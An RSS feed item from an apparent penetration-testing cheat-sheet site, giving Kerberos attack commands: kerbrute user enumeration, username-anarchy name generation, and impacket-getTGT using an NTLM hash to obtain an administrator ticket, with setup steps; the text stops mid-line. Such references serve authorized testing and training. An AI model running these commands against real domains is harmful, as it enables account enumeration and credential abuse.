channel.title: Kerbrute on TLDRBins
channel.description: Recent content in Kerbrute on TLDRBins

item.title: Kerberos
item.description: Users enum kerbrute kerbrute userenum --domain <DOMAIN> --dc <DC> usernames.txt Ref: kerbrute Usernames generator username-anarchy ./username-anarchy -i users.txt | tee usernames.txt Ref: username-anarchy Generate Kerberos ticket (From Linux) Impacket Kinit sudo ntpdate -s <DC> && impacket-getTGT -hashes :<HASH> <DOMAIN>/administrator export KRB5CCNAME=administrator.ccache # Check ticket klist # Step 0: Installation sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to '/etc/hosts' (Try different order if not work) 10.10.11.10 <DC> <DOMAIN> # Step 2: Add domain controller as a DNS server to '/etc/resolv.
